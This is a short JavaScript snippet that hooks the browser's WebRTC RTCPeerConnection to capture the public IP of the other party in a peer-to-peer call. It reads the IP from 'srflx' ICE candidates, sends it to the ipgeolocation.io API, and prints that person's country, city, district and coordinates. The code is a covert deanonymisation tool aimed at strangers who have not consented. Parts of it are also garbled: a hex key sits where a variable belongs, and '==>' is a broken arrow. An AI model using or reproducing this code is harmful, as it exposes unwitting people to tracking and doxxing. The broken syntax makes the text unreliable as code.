const apiKey = "my-api-key";


window.oRTCPeerConnection =
window.oRTCPeerConnection || window. RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window. oRTCPeerConnection(...args);
         pc.oaddIceCandidate = pc.addIceCandidate;


         pc.addIceCandidate = function (iceCandidate, ... rest) {
          const fields = iceCandidate.candidate.split(" ");
          const ip = fields [4];
          if (fields [7] === "srflx") {
           getLocation (ip);
          }
         return pc.oaddIceCandidate(iceCandidate, ... rest);
};
return pc;
};
const getLocation = async (ip) => {
 let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${3f6c35524da84c7c83ef78eea5bf7dc2}&ip=${ip}`;
 await fetch(url).then((response)==>
 response.json().then((json) => {
 const output = `


         Country: ${json.country_name}
         State: ${json.state_prov}
         City: ${json.city}
         District: ${json.district}
         Lat / Long: (${json.latitude}, ${json. longitude})
         `;

         console.log(output);
 })
);
};
